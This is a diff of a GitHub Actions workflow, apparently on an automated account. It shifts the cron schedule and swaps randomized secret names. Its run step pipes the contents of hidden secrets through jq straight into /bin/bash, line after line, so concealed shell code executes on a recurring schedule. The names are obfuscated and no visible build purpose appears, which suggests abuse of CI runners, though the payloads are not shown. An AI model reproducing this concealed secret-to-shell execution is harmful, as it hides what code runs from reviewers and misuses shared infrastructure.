@@ -3,29 +3,24 @@ name: jiangguotao1985
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
+    - cron: '6 3/6 * * *'
 
-jobs:  # 21233
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiangguotao1985
         env:
-          yqfx80: ${{ secrets.yqfx80 }}
+          bjtn686: ${{ secrets.bjtn686 }}
         run: |
-          echo $yqfx80 | jq -r .wccro458 | /bin/bash
-          echo $rdq65 | jq -r .ro9 | /bin/bash
-          echo $uq0 | jq -r .a0635 | /bin/bash
-          echo $stagh9182 | jq -r .ov1869 | /bin/bash
-          echo $zt540 | jq -r .xyptw14 | /bin/bash
-          echo $mrcc7743 | jq -r .k12 | /bin/bash
-          echo $rjup3 | jq -r .t113 | /bin/bash
-          echo $iaygw3 | jq -r .eyaci170 | /bin/bash
-          echo $qzh58004 | jq -r .r634 | /bin/bash
-          echo $ape348 | jq -r .ggpyv0 | /bin/bash
-          echo $y7882 | jq -r .lzf884 | /bin/bash
-          echo $v14120 | jq -r .sku8436 | /bin/bash
-          echo $hzzao07789 | jq -r .hky6648 | /bin/bash
+          echo $bjtn686 | jq -r .lgv786 | /bin/bash
+          echo $hkojz94 | jq -r .k818 | /bin/bash
+          echo $gmt84 | jq -r .dnkec71375 | /bin/bash
+          echo $t15 | jq -r .ipto05 | /bin/bash
+          echo $cg58274 | jq -r .kabz6097 | /bin/bash
+          echo $g19 | jq -r .e7003 | /bin/bash
+          echo $btf35 | jq -r .sriz4018 | /bin/bash
+          echo $u958 | jq -r .pk40 | /bin/bash
+          echo $fva2491 | jq -r .vx837 | /bin/bash
 
